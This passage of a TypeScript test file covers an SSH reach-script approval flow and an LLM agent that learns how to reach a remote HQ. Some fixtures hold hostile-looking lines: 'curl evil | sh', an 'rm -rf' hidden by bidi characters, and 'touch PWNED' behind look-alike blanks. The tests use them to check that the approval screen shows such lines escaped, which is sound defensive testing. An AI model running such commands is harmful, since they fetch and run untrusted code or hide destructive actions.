  fs.writeFileSync(paths.approved, "echo one\ncurl evil | sh\nexit 3\n")
  fs.writeFileSync(paths.script, "echo one\ncurl evil | sh\nexit 3\n")
  const v = visitDeps(dir, fake, { answers: ["2"] })
  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
  expect(v.prompter.seen).toContain("  2  curl evil | sh")
  expect(v.prompter.seen).toContain(runThis(3))
  expect(v.prompter.seen).not.toContain(useChanged(3))
})

test("bidi and other invisible characters in reach.sh are shown escaped", async () => {
  const { dir, fake } = fakeHome()
  const paths = new ReachPaths(dir)
  makeDirs(paths)
  fs.writeFileSync(paths.script, "echo 'safe\u202e; rm -rf x \u2066'\u200b\nexit 3\n")
  const v = visitDeps(dir, fake, { answers: ["2"] })
  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
  expect(v.prompter.seen).toContain("  1  echo 'safe<U+202E>; rm -rf x <U+2066>'<U+200B>")
})

test("at a numbered approval question the first Ctrl-C exits 130", async () => {
  const { dir, fake } = fakeHome()
  const paths = new ReachPaths(dir)
  makeDirs(paths)
  fs.writeFileSync(paths.script, NO_JOB(path.join(dir, "ran")))
  const v = visitDeps(dir, fake)
  const shown = new PassThrough()
  let text = ""
  shown.setEncoding("utf8").on("data", (chunk: string) => (text += chunk))
  // A dumb terminal: the list is numbered and a line answers it, so Ctrl-C reaches the visit as SIGINT.
  const prompter = new TtyPrompter({ input: v.stdin, output: shown, interactive: true, env: { TERM: "dumb" } })
  const done = visit({ signIn: false, open: false }, { ...v.deps, prompter })
  await waitFor(() => text.includes(`${runThis(3)} [${STOP}]: `), { what: "the question" })
  v.sigint()
  expect(await done).toBe(130)
  expect(v.errors).toEqual([])
  expect(fs.existsSync(paths.access)).toBe(false)
})

test("a failure's own closing period isn't doubled", () => {
  expect(describeFailure(new ReachFailure("no_office", "The office isn't running."), 1).line).toBe(
    "opencorp hq: no office answers there: The office isn't running. Start the job or the office there, or run `opencorp hq --relearn` if HQ moved for good.",
  )
  expect(describeFailure(new ReachFailure("not_ready", "HQ can't be reached..."), 1).line).toBe(
    "opencorp hq: HQ isn't ready there: HQ can't be reached. Run `opencorp doctor` there, or update that checkout.",
  )
})

const call = (name: string, args: unknown): ScriptedReply => ({ tool_calls: [{ name, arguments: args }] })
const NOTES = "Log in to login1; HQ runs on node1.\n"

/** A home with no reach.sh, HQ's machine reachable as node1 through login1, the fake model, and (unless `provider` is
 *  false) hq/provider.json for it. */
async function unlearnedHome({ provider = true, behavior = {} }: { provider?: boolean; behavior?: FakeSshBehavior } = {}) {
  const { dir, fake } = fakeHome(behavior)
  const remote = await fakeRemote(dir)
  const llm = await fakeLlm()
  const spec: Spec = { host: "node1", jump: ["login1"], opencorp: remote.opencorp }
  const paths = new ReachPaths(dir)
  if (provider) {
    fs.mkdirSync(paths.dir, { mode: 0o700 })
    await writePrivate(paths.provider, JSON.stringify({ llm_config: LLM_CONFIG, env: llm.env() }))
  }
  return { dir, fake, remote, llm, spec, paths, port: await freePort() }
}

test("with no saved path it shows the risks, asks, then learns and goes on with the open connection", async () => {
  const { dir, fake, remote, llm, spec, paths, port } = await unlearnedHome()
  const script = scriptFor(spec)
  llm.script(
    call("shell", { command: "ssh login1 true", why: "log in to login1" }),
    call("save_access", { script, notes: NOTES, risks: [] }),
    { content: "HQ is reachable from here now." },
  )
  const v = visitDeps(dir, fake, { answers: ["1", "1", "1"] })
  const done = visit({ signIn: false, port, open: false }, v.deps)
  await waitFor(() => v.printed.some((line) => line.startsWith("Connected.")) || v.errors.length > 1, { what: "the visit to connect" })
  expect(v.errors).toEqual([NO_OFFICE_HERE])
  expect(v.prompter.seen.slice(0, beforeLearning(paths).length + 1)).toEqual([...beforeLearning(paths), LEARN_QUESTION])
  expect(v.prompter.offered[0]).toEqual([LEARN, STOP])
  expect(fs.readFileSync(paths.script, "utf8")).toBe(script)
  expect(v.printed).toContain(`http://127.0.0.1:${port}/pair#${remote.code}`)
  expect((await readAccess(paths))?.signed_in_at).not.toBeNull()
  // save_access's connection is the visit's: one node master, not a second login.
  expect(fake.calls().filter((argv) => argv.includes("-M"))).toHaveLength(1)
  v.sigint()
  expect(await done).toBe(0)
  expect(leftover(fake, paths)).toEqual({ cm: [], masters: [], processes: [] })
})

test("declining to learn, or a stray Enter, exits 3, calls no model and makes nothing", async () => {
  const { dir, fake, llm, paths } = await unlearnedHome({ provider: false })
  // The default is Stop: a model run needs an explicit choice.
  for (const answer of ["2", ""]) {
    const v = visitDeps(dir, fake, { answers: [answer] })
    expect(await visit({ signIn: false, open: false }, v.deps)).toBe(3)
    expect(v.errors).toEqual([NO_OFFICE_HERE, "opencorp hq: stopped; nothing was learned."])
  }
  expect(llm.requests()).toEqual([])
  expect(fs.existsSync(paths.dir)).toBe(false)
  expect(fake.calls()).toEqual([])
})

test("Ctrl-C at the question to learn exits 130 and makes nothing", async () => {
  const { dir, fake, paths } = await unlearnedHome({ provider: false })
  const v = visitDeps(dir, fake)
  v.prompter.choose = async () => {
    throw new KeyboardInterrupt()
  }
  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(130)
  expect(fs.existsSync(paths.dir)).toBe(false)
})

test("the first learning run asks for the model and keeps it in hq/provider.json", async () => {
  const { dir, fake, llm, paths } = await unlearnedHome({ provider: false })
  llm.script({ content: "I can't tell how to reach HQ." })
  const checked: unknown[] = []
  // vllm at the fake model's URL: no key, the stub model.
  const v = visitDeps(dir, fake, {
    answers: ["1", "vllm", llm.baseUrl + "/v1", "", "stub"],
    checkModel: async (p) => {
      checked.push(p.llm_config)
      return null
    },
  })
  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
  expect(v.prompter.seen).toContain(`Learning needs a model. Its connection is kept in ${paths.provider}, readable only by you.`)
  expect(checked).toHaveLength(1)
  expect(fs.statSync(paths.provider).mode & 0o777).toBe(0o600)
  expect(fs.statSync(paths.dir).mode & 0o777).toBe(0o700)
  expect(v.errors.at(-1)).toBe("opencorp hq: nothing was saved: I can't tell how to reach HQ.")
  expect(fs.existsSync(paths.script)).toBe(false)
})

test("at the turn cap the visit prints the commands and saves nothing", async () => {
  const { dir, fake, llm, paths } = await unlearnedHome()
  // The 30th reply's call never runs, and the model's answer after the cap ends the run.
  llm.script(
    ...Array.from({ length: 30 }, (_, i) => call("shell", { command: `echo ${i}`, why: "look" })),
    { content: "No working path yet." },
  )
  const v = visitDeps(dir, fake, { answers: ["1", ...Array(29).fill("1")] })
  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
  const at = v.errors.indexOf(CAPPED)
  expect(at).toBe(1)
  expect(v.errors.slice(at + 1)).toEqual(Array.from({ length: 29 }, (_, i) => `  (exit 0) echo ${i}`))
  expect(fs.existsSync(paths.script)).toBe(false)
  expect(fs.existsSync(paths.access)).toBe(false)
  expect(leftover(fake, paths)).toEqual({ cm: [], masters: [], processes: [] })
}, 60_000)

test("when the model's answer after the turn cap fails, the visit says why after the commands", async () => {
  const { dir, fake, llm, paths } = await unlearnedHome()
  const calls = Array.from({ length: 30 }, (_, i) => call("shell", { command: `echo ${i}`, why: "look" }))
  llm.script(...calls, { error: 400 })
  const v = visitDeps(dir, fake, { answers: ["1", ...Array(29).fill("1")] })
  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
  expect(v.errors.slice(0, 2)).toEqual([NO_OFFICE_HERE, CAPPED])
  expect(v.errors.slice(2, -1)).toEqual(Array.from({ length: 29 }, (_, i) => `  (exit 0) echo ${i}`))
  expect(v.errors.at(-1)).toStartWith(AFTER_CAP(""))
  expect(v.errors.at(-1)).toContain("scripted error 400")
  expect(fs.existsSync(paths.script)).toBe(false)
  expect(leftover(fake, paths)).toEqual({ cm: [], masters: [], processes: [] })
}, 60_000)

test("--relearn gives the agent the old notes and script, and keeps the old path until the new one passes", async () => {
  const { dir, fake, llm, spec, paths, port, remote } = await unlearnedHome()
  const old = `set -eu\n# the old way\nssh login1 true\nprintf '%s\\n' '${JSON.stringify({ ...spec, host: "node9" })}'\n`
  await saved(dir, old, { port, signed_in_at: new Date().toISOString() })
  await writePrivate(paths.notes, "The job used to run on node9.\n")
  const script = scriptFor(spec)
  llm.script(
    call("save_access", { script: "set -eu\nssh login1 true\nexit 1\n", notes: NOTES, risks: [] }),
    call("shell", { command: `cat '${paths.script}' '${paths.access}'`, why: "see what's saved" }),
    call("save_access", { script, notes: NOTES, risks: [] }),
    { content: "HQ is on node1 now." },
  )
  const v = visitDeps(dir, fake, { answers: ["", "1", "1", "1"] })
  const done = visit({ signIn: false, open: false, relearn: true }, v.deps)
  await waitFor(() => v.printed.some((line) => line.startsWith("Connected.")) || v.errors.length > 0, { what: "the visit to connect" })
  expect(v.errors).toEqual([])
  expect(v.prompter.seen.slice(0, beforeLearning(paths).length + 1)).toEqual([...beforeLearning(paths), RELEARN_QUESTION])
  const [first, , third] = llm.requests().map((r) => JSON.stringify(r))
  expect(first).toContain("# the old way")
  expect(first).toContain("The job used to run on node9.")
  // After the failed save, the old script and record were still the saved ones.
  expect(third).toContain("# the old way")
  expect(third).toContain(sha256(old))
  expect(fs.readFileSync(paths.script, "utf8")).toBe(script)
  // Another host than the old path's (node9): the browser may not have a session there, so it signs in again.
  expect(v.printed).toContain(`http://127.0.0.1:${port}/pair#${remote.code}`)
  v.sigint()
  expect(await done).toBe(0)
  expect(leftover(fake, paths)).toEqual({ cm: [], masters: [], processes: [] })
})

test("--relearn without a terminal says learning needs one and runs nothing", async () => {
  const { dir, fake } = fakeHome()
  const marker = path.join(dir, "ran")
  const paths = await saved(dir, NO_JOB(marker))
  const before = fs.readFileSync(paths.access, "utf8")
  const v = visitDeps(dir, fake, { interactive: false })
  expect(await visit({ signIn: false, open: false, relearn: true }, v.deps)).toBe(1)
  expect(v.errors).toEqual(["opencorp hq: learning needs a terminal; run `opencorp hq --relearn` in one."])
  expect(fs.readFileSync(paths.access, "utf8")).toBe(before)
  expect(fs.existsSync(marker)).toBe(false)
  expect(fake.calls()).toEqual([])
})

test("a broken path asks to relearn with the failure, defaulting to stop", async () => {
  const { dir, fake, llm, paths, port } = await unlearnedHome()
  await saved(dir, `set -eu\nssh login1 true\necho "squeue: no such job" >&2\nexit 1\n`, { port })
  const line = "opencorp hq: the saved way to reach HQ is broken: reach.sh exited 1: squeue: no such job"
  let v = visitDeps(dir, fake, { answers: [""] })
  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
  expect(v.errors).toEqual([line])
  expect(v.prompter.seen.slice(0, beforeLearning(paths).length + 1)).toEqual([...beforeLearning(paths), RELEARN_QUESTION])
  expect(llm.requests()).toEqual([])
  llm.script({ content: "The job is gone; start it again." })
  v = visitDeps(dir, fake, { answers: ["1"] })
  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
  expect(v.errors).toEqual([line, "opencorp hq: nothing was saved: The job is gone; start it again."])
  expect(JSON.stringify(llm.requests()[0])).toContain("squeue: no such job")
  // Without a terminal there's no one to ask: the failure alone.
  v = visitDeps(dir, fake, { interactive: false })
  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
  expect(v.errors).toEqual([line])
  expect(leftover(fake, paths)).toEqual({ cm: [], masters: [], processes: [] })
})

test("--relearn while another opencorp hq holds the connection says to end it first", async () => {
  const { dir, fake, paths } = await approvedHome({}, { signed_in_at: new Date().toISOString() })
  const v = await connected(dir, fake, { signIn: false, open: false })
  const second = visitDeps(dir, fake)
  expect(await visit({ signIn: false, open: false, relearn: true }, second.deps)).toBe(1)
  expect(second.errors).toEqual([RELEARN_BUSY])
  expect(second.opened).toEqual([])
  v.sigint()
  expect(await v.done).toBe(0)
  expect(leftover(fake, paths)).toEqual({ cm: [], masters: [], processes: [] })
})

test("while learning, login masters stay 10 minutes after their last use; afterwards a visit's stay 60 s", async () => {
  const { dir, fake, llm, paths } = await unlearnedHome()
  llm.script(call("shell", { command: 'grep ControlPersist "$OPENCORP_SSH_CONFIG"', why: "look" }), { content: "Done." })
  const v = visitDeps(dir, fake, { answers: ["1", "1"] })
  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
  expect(JSON.stringify(llm.requests()[1])).toContain("ControlPersist 600")
  expect(fs.readFileSync(paths.config, "utf8")).toContain("\nControlPersist 60\n")
  expect(fs.readFileSync(paths.batchConfig, "utf8")).toContain("\nControlPersist 60\n")
})

test.each(["\u00a0", "\u202f", "\u3000", "\u2028", "\u2800", "\u3164"])(
  "an owner-written reach.sh with a look-alike blank is shown escaped, not refused [%p]",
  async (blank) => {
    const hex = blank.codePointAt(0)!.toString(16).toUpperCase().padStart(4, "0")
    const { dir, fake } = fakeHome()
    const paths = new ReachPaths(dir)
    makeDirs(paths)
    fs.writeFileSync(paths.script, `echo listing jobs${blank}# ; touch PWNED\n${"\n".repeat(30)}exit 3\n`)
    const v = visitDeps(dir, fake, { answers: ["2"] })
    expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
    expect(v.prompter.seen).toContain(`   1  echo listing jobs<U+${hex}># ; touch PWNED`)
    expect(v.prompter.seen).toContain("      (30 blank lines)")
    expect(v.prompter.seen).toContain(runThis(32))
    expect(v.errors).toEqual(["opencorp hq: stopped; reach.sh isn't approved."])
  },
)

test("the old notes and script a relearn reads are cut without splitting an emoji", async () => {
  const { dir } = fakeHome()
  const paths = new ReachPaths(dir)
  makeDirs(paths)
  await writePrivate(paths.notes, `${"n".repeat(MAX_OLD_CHARS - 1)}\u{1F600}more`)
  await writePrivate(paths.script, "exit 3\n")
  expect(lastPath(paths)).toEqual({ notes: "n".repeat(MAX_OLD_CHARS - 1), script: "exit 3\n" })
})

test("the agent's last reply is printed without the model's key or a sign-in code", async () => {
  const { dir, fake, llm, paths } = await unlearnedHome()
  const key = "sk-test-0123456789abcdefghij"
  await writePrivate(paths.provider, JSON.stringify({ llm_config: { ...LLM_CONFIG, api_key: key }, env: llm.env() }))
  llm.script({ content: `Your key is ${key}; try http://127.0.0.1:1/pair#AbCdEfGhIjKlMnOpQrStUv` })
  const v = visitDeps(dir, fake, { answers: ["1"] })
  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
  expect(v.errors.at(-1)).toBe("opencorp hq: nothing was saved: Your key is [redacted]; try http://127.0.0.1:1/pair#[redacted]")
})

test("Ctrl-C during the first run's model check stops the check and exits 130", async () => {
  const { dir, fake, llm, paths } = await unlearnedHome({ provider: false })
  let started = false
  let stopped = false
  const v = visitDeps(dir, fake, {
    answers: ["1", "vllm", llm.baseUrl + "/v1", "", "stub"],
    checkModel: (_provider, signal) => {
      started = true
      return new Promise((resolve) =>
        signal.addEventListener("abort", () => {
          stopped = true
          resolve("stopped")
        }),
      )
    },
  })
  const done = visit({ signIn: false, open: false }, v.deps)
  await waitFor(() => started, { what: "the model check" })
  v.sigint()
  expect(await done).toBe(130)
  expect(stopped).toBe(true)
  expect(fs.existsSync(paths.provider)).toBe(false)
})

test("Ctrl-C while the first run's ChatGPT sign-in waits exits 130 and saves nothing", async () => {
  const { dir, fake, paths } = await unlearnedHome({ provider: false })
  const subscription = fakeSubscription({ approved: new Promise(() => {}) })
  // Learn it, openai, the subscription.
  const v = visitDeps(dir, fake, { answers: ["1", "openai", ""], auth: subscription.auth })
  const done = visit({ signIn: false, open: false }, v.deps)
  await waitFor(() => v.prompter.seen.includes(signInLine(DEVICE_URL, DEVICE_CODE)), { what: "the code" })
  v.sigint()
  expect(await done).toBe(130)
  expect(subscription.signals.map((signal) => signal.aborted)).toEqual([true])
  expect(fs.existsSync(paths.auth)).toBe(false)
  expect(fs.existsSync(paths.provider)).toBe(false)
})

test("a learning run that saves nothing lists the commands the model asked for", async () => {
  const { dir, fake, llm } = await unlearnedHome()
  llm.script(
    call("shell", { command: "echo hi\necho there", why: "look" }),
    call("shell", { command: "touch x", why: "try" }),
    { content: "I can't tell." },
  )
  const v = visitDeps(dir, fake, { answers: ["1", "1", "2", ""] })
  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
  expect(v.errors).toEqual([
    NO_OFFICE_HERE,
    "opencorp hq: nothing was saved: I can't tell.",
    ASKED_FOR,
    "  (exit 0) echo hi (and 1 more line)",
    "  (not run) touch x",
  ])
})

test("Ctrl-C while learning lists the commands the model asked for", async () => {
  const { dir, fake, llm } = await unlearnedHome()
  llm.script(call("shell", { command: "true", why: "look" }), call("shell", { command: "echo started >&2; sleep 30", why: "wait" }))
  const v = visitDeps(dir, fake, { answers: ["1", "1", "1"] })
  const done = visit({ signIn: false, open: false }, v.deps)
  await waitFor(() => v.echoed.join("").includes("started"), { what: "the second command" })
  v.sigint()
  expect(await done).toBe(130)
  expect(v.errors.slice(1, 3)).toEqual([ASKED_FOR, "  (exit 0) true"])
})

test("--relearn with an access.json that isn't valid warns and relearns as if there were none", async () => {
  const { dir, fake, llm, paths } = await unlearnedHome()
  fs.writeFileSync(paths.script, "exit 3\n", { mode: 0o600 })
  fs.writeFileSync(paths.access, "{nope", { mode: 0o600 })
  llm.script({ content: "Nothing to learn." })
  const v = visitDeps(dir, fake, { answers: [""] })
  expect(await visit({ signIn: false, open: false, relearn: true }, v.deps)).toBe(1)
  expect(v.errors).toEqual([
    `opencorp hq: ${paths.access} isn't JSON; relearning as if there were none.`,
    "opencorp hq: nothing was saved: Nothing to learn.",
  ])
  expect(llm.requests()).toHaveLength(1)
})

/** The fake model, and a provider for it. */
async function model() {
  const llm = await fakeLlm()
  return { llm, provider: Provider.parse({ llm_config: LLM_CONFIG, env: llm.env() }) }
}

const NO_INPUTS = { notes: "", script: "", failure: "" }

test("a learning run asks, runs approved commands and saves through save_access", async () => {
  const { llm, provider } = await model()
  const c = await chain(["login1.example.edu", "1", "1"])
  const script = scriptFor(c.spec)
  llm.script(
    call("ask_user", { question: "Which login node do you use?" }),
    call("shell", { command: "pwd; ssh login1 true", why: "check that login1 answers" }),
    call("save_access", { script, notes: NOTES, risks: ["Duo on the node too: two prompts."] }),
    { content: "HQ is reachable." },
  )
  const got = await runLearn(provider, NO_INPUTS, c.state)
  expect(got).toEqual({ output: "HQ is reachable.", message: null, capped: false })
  // Marked as the agent's, with where the answer goes.
  expect(c.prompter.seen.slice(0, 2)).toEqual([ANSWER_GOES_TO_MODEL, "The agent asks: Which login node do you use?"])
  expect(ANSWER_GOES_TO_MODEL).toBe(
    "Your answer goes to the model. Type passwords, passphrases and codes only at ssh's own prompts, never here.",
  )
  expect(fs.readFileSync(c.ctx.paths.script, "utf8")).toBe(script)
  expect(fs.readFileSync(c.ctx.paths.notes, "utf8")).toBe(NOTES)
  expect(c.state.connection).not.toBeNull()
  expect(c.state.commands).toEqual([{ command: "pwd; ssh login1 true", code: 0 }])
  // The folder commands ran in is gone once the run ends.
  const work = /"stdout\\":\\"([^"\\]+)\\\\n/.exec(JSON.stringify(llm.requests()[2]))![1]!
  expect(path.basename(work)).toStartWith("opencorp-learn-")
  expect(fs.existsSync(work)).toBe(false)
  const requests = llm.requests()
  expect(requests).toHaveLength(4)
  expect(JSON.stringify(requests[1])).toContain("login1.example.edu")
  expect(JSON.stringify(requests[2])).toContain('\\"exit\\":0')
  expect(JSON.stringify(requests[3])).toContain(`${SAVED} Reply with one line for the owner.`)
  await exitAll(c.ctx)
  expect(c.fake.masters()).toEqual([])
})

test("at the turn cap it lists the commands asked for and saves nothing", async () => {
  const { llm, provider } = await model()
  const c = await chain(Array(29).fill("1"))
  // The 30th reply's call never runs: the model reads the cap's error result and answers once more.
  llm.script(
    ...Array.from({ length: 30 }, (_, i) => call("shell", { command: `echo ${i}`, why: "look" })),
    { content: "No working path yet." },
  )
  const got = await runLearn(provider, NO_INPUTS, c.state)
  expect(got).toEqual({ output: "No working path yet.", message: null, capped: true })
  expect(c.state.commands).toEqual(Array.from({ length: 29 }, (_, i) => ({ command: `echo ${i}`, code: 0 })))
  expect(JSON.stringify(llm.requests().at(-1))).toContain("Tool-call limit reached (30 turns)")
  expect(fs.existsSync(c.ctx.paths.script)).toBe(false)
  expect(c.state.connection).toBeNull()
}, 60_000)

test("a reply after the turn cap that still calls tools runs none of them, and nothing is saved", async () => {
  const { llm, provider } = await model()
  const c = await chain(Array(29).fill("1"))
  llm.script(
    ...Array.from({ length: 30 }, (_, i) => call("shell", { command: `echo ${i}`, why: "look" })),
    call("save_access", { script: scriptFor(c.spec), notes: NOTES, risks: [] }),
  )
  const got = await runLearn(provider, NO_INPUTS, c.state)
  expect(got).toEqual({ output: "", message: null, capped: true })
  expect(c.state.commands).toHaveLength(29)
  expect(llm.requests()).toHaveLength(31)
  expect(fs.existsSync(c.ctx.paths.script)).toBe(false)
  expect(c.state.connection).toBeNull()
}, 60_000)

/** A prompter whose input has ended. */
class Closed extends Script {
  static readonly error = new OnboardError("no answer to 'Which node?' (stdin closed)")
  override async ask(question: string): Promise<string> {
    this.seen.push(question)
    throw Closed.error
  }
  override async choose(question: string): Promise<string> {
    this.seen.push(question)
    throw Closed.error
  }
}

test("the owner's input ending stops the run with that error", async () => {
  const { llm, provider } = await model()
  const { dir, fake } = fakeHome()
  const ctx = await reachCtx(dir, fake)
  const state = new Learning(ctx, new Closed(), new PassThrough(), [], 49381)
  llm.script(call("ask_user", { question: "Which node?" }))
  expect(await rejection(runLearn(provider, NO_INPUTS, state))).toBe(Closed.error)
  const shell = new Learning(ctx, new Closed(), new PassThrough(), [], 49381)
  llm.script(call("shell", { command: "true", why: "x" }))
  expect(await rejection(runLearn(provider, NO_INPUTS, shell))).toBe(Closed.error)
  expect(llm.pending()).toEqual([])
})

test("the learning run reads the sign-in YIAN_AUTH_FILE names", async () => {
  const { dir, fake } = fakeHome()
  const ctx = await reachCtx(dir, fake)
  const provider = await learnProvider(ctx.paths, new Script(["openai", "", ""]), subscribed().options)
  // Damaged after it was checked, so the run stops reading it, before any request.
  fs.writeFileSync(ctx.paths.auth, "{nope", { mode: 0o600 })
  const state = new Learning(ctx, new Script([]), new PassThrough(), [], 49381)
  const got = await runLearn(provider, NO_INPUTS, state)
  expect(got.output).toBeNull()
  expect(got.message).toContain(`Credential storage at ${ctx.paths.auth}`)
})

test("tokens yian refreshes during the run are scrubbed from command output with the old ones, and kept out of notes.md", async () => {
  const { dir, fake } = fakeHome()
  const ctx = await reachCtx(dir, fake)
  const old = tokens("old", -60)
  const saved = await new AuthStore(ctx.paths.auth).save("openai", old, "gpt-5.5")
  const provider = withSignIn(ConnectionFile.parse({ method: "subscription", llm_config: SUBSCRIBED_LLM }), ctx.paths.auth)
  // As run.ts makes it.
  const state = new Learning(ctx, new Script(["1"]), new PassThrough(), () => providerSecrets(provider, workerEnv(ctx.env)), 49381)
  onTestFinished(() => state.close())
  // The run's first model call refreshes the expired tokens through yian's own store, which writes the new ones.
  const fresh = tokens("new", 3600)
  await new AuthStore(ctx.paths.auth).credentials("openai", saved.credentialId, { refresh: async () => fresh })
  expect(new AuthStore(ctx.paths.auth).savedSecrets("openai")[0]).toBe(fresh.accessToken)
  const result = JSON.parse(
    await runShell({ command: `cat '${ctx.paths.auth}'; echo ${old.accessToken}`, why: "look" }, state),
  ) as { stdout: string }
  expect(result.stdout).toContain("[redacted]")
  for (const token of [fresh.accessToken, fresh.refreshToken, old.accessToken]) expect(result.stdout).not.toContain(token)
  const error = await rejection(saveAccess({ script: "echo {}\n", notes: `${fresh.refreshToken}\n`, risks: [] }, state))
  expect(error.message).toBe(
    "Not saved: notes.md: it holds the model's API key or sign-in token; SSH asks for passwords and Duo itself, so leave them out.",
  )
})

test("a learning run's failure on a refused sign-in says how to sign in again here, not with yian auth", () => {
  const paths = new ReachPaths("/h/we$&ird$`")
  const provider = withSignIn(ConnectionFile.parse({ method: "subscription", llm_config: SUBSCRIBED_LLM }), paths.auth)
  const hint = ". Run 'yian auth openai' and start a new run"
  const yian = `OpenAI authentication request failed (HTTP 401, refresh_token_reused); sign in again${hint}`
  expect(learnedMessage(yian, provider, paths)).toBe(
    "OpenAI authentication request failed (HTTP 401, refresh_token_reused); sign in again: delete" +
      " /h/we$&ird$`/hq/auth.json and run `opencorp hq` again",
  )
  // A failure that may pass keeps the sign-in.
  for (const why of ["(could not connect)", "(HTTP 429)", "(HTTP 502)"]) {
    expect(learnedMessage(`OpenAI authentication request failed ${why}${hint}`, provider, paths)).toBe(
      `OpenAI authentication request failed ${why}: run \`opencorp hq\` again later`,
    )
  }
  expect(learnedMessage(`node learn failed: OpenAI authentication request failed (HTTP 403)${hint}`, provider, paths)).toBe(
    "node learn failed: OpenAI authentication request failed (HTTP 403): delete /h/we$&ird$`/hq/auth.json and run" +
      " `opencorp hq` again",
  )
  // On a key, or yian's own login, yian's hint is the fix.
  const keyless = Provider.parse({ llm_config: SUBSCRIBED_LLM })
  expect(learnedMessage(yian, keyless, paths)).toBe(yian)
  expect(learnedMessage(null, provider, paths)).toBeNull()
})

/** A setup screen for learning, in this process, that answers each question with the next of `answers` (an option
 *  as written, or "" for the default) and each hand-over at once. `atQuestion(n)` runs at its nth question (from 1)
 *  before it answers; returning false leaves that question unanswered. */
function fakeScreen(answers: string[], atQuestion: (n: number, interrupt: () => void) => boolean = () => true) {
  const prompts: { type: string; [key: string]: unknown }[] = []
  const events: string[] = []
  const screen: LearnScreen = async (learn, interrupt) => {
    events.push("open")
    const stream = new PassThrough()
    let questions = 0
    const answer = (text: string) => stream.write(JSON.stringify({ answer: text }) + "\n")
    const io = {
      prompts: {
        write(text: string) {
          for (const line of text.split("\n").filter(Boolean)) {
            const prompt = JSON.parse(line)
            prompts.push(prompt)
            if (prompt.type === "hand_over") answer("")
            else if (["ask", "choose", "secret"].includes(prompt.type) && atQuestion(++questions, interrupt))
              answer(answers.shift() ?? "")
          }
          return true
        },
      },
      answers: stream,
      echo: (text: string) => void events.push(`echo ${text}`),
    }
    try {
      return await learn(io)
    } finally {
      events.push("closed")
    }
  }
  return { screen, prompts, events }
}

test("with a screen, learning runs behind it, risks first, and the visit goes on plainly once it's gone", async () => {
  const { dir, fake, llm, spec, paths, port } = await unlearnedHome()
  const script = scriptFor(spec)
  llm.script(
    call("shell", { command: "echo hi", why: "say hi" }),
    call("save_access", { script, notes: NOTES, risks: [] }),
    { content: "HQ is reachable from here now." },
  )
  const s = fakeScreen(["Run it", "Test it, then save it"])
  const v = visitDeps(dir, fake, { answers: ["1"], learnScreen: s.screen })
  const print = v.deps.print
  v.deps.print = (line) => {
    s.events.push(`print ${line.split(" ")[0]}`)
    print(line)
  }
  const done = visit({ signIn: false, port, open: false }, v.deps)
  await waitFor(() => v.printed.some((line) => line.startsWith("Connected.")) || v.errors.length > 1, { what: "the visit to connect" })
  // The offer and its risks stay plain; only learning is behind the screen, and it doesn't repeat the risks there.
  expect(v.prompter.seen).toEqual([...beforeLearning(paths), LEARN_QUESTION])
  const said = s.prompts.filter((p) => p.type === "say").map((p) => p.text)
  for (const risk of beforeLearning(paths)) expect(said).not.toContain(risk)
  expect(s.prompts.filter((p) => p.type !== "say").map((p) => p.type)).toEqual([
    "command", "choose", "hand_over", "take_back", "result", "review", "choose", "hand_over", "take_back",
  ])
  expect(s.prompts.filter((p) => p.type === "hand_over").map((p) => p.why)).toEqual([HAND_OVER_COMMAND, HAND_OVER_TEST])
  expect(s.prompts.find((p) => p.type === "result")).toEqual({ type: "result", title: "Exited 0", ok: true, lines: ["hi"] })
  expect(said.at(-1)).toBe(SAVED)
  // While the command ran, its output went to the terminal through the screen's echo; the visit's own lines come
  // once the screen is gone.
  expect(s.events).toContain("echo hi\n")
  expect(v.echoed.join("")).not.toContain("hi")
  const closed = s.events.indexOf("closed")
  expect(s.events.slice(0, closed).some((e) => e.startsWith("print"))).toBe(false)
  expect(s.events.slice(closed + 1)).toContain("print Connected.")
  expect(fs.readFileSync(paths.script, "utf8")).toBe(script)
  v.sigint()
  expect(await done).toBe(0)
  expect(leftover(fake, paths)).toEqual({ cm: [], masters: [], processes: [] })
})

test("Ctrl-C on the screen stops learning as the terminal's Ctrl-C does: 130, and the commands listed after it", async () => {
  const { dir, fake, llm } = await unlearnedHome()
  llm.script(call("shell", { command: "true", why: "look" }), call("shell", { command: "touch x", why: "try" }))
  const s = fakeScreen(["Run it"], (n, interrupt) => {
    if (n < 2) return true
    interrupt()
    return false
  })
  const v = visitDeps(dir, fake, { answers: ["1"], learnScreen: s.screen })
  const error = v.deps.error
  v.deps.error = (line) => {
    s.events.push(`error ${line}`)
    error(line)
  }
  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(130)
  const closed = s.events.indexOf("closed")
  expect(closed).toBeGreaterThan(0)
  expect(s.events.slice(closed + 1)).toEqual([`error ${ASKED_FOR}`, "error   (exit 0) true"])
})

test("a second Ctrl-C on the screen ends the visit at once, as at the terminal", async () => {
  const { dir, fake, llm } = await unlearnedHome()
  llm.script(call("shell", { command: "true", why: "look" }))
  const exits: number[] = []
  const s = fakeScreen([], (_n, interrupt) => {
    interrupt()
    try {
      interrupt()
    } catch {}
    return false
  })
  const v = visitDeps(dir, fake, { answers: ["1"], learnScreen: s.screen })
  v.deps.exit = (code) => {
    exits.push(code)
    throw new Error(`exit ${code}`)
  }
  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(130)
  expect(exits).toEqual([130])
})

test("when the screen can't start, the visit says why, calls no model and exits 1", async () => {
  const { dir, fake, llm } = await unlearnedHome()
  const v = visitDeps(dir, fake, {
    answers: ["1"],
    learnScreen: async () => {
      throw new Error("can't show the learning screen: no terminal")
    },
  })
  expect(await visit({ signIn: false, open: false }, v.deps)).toBe(1)
  expect(v.errors).toEqual([NO_OFFICE_HERE, "opencorp hq: can't show the learning screen: no terminal"])
  expect(llm.requests()).toEqual([])
})
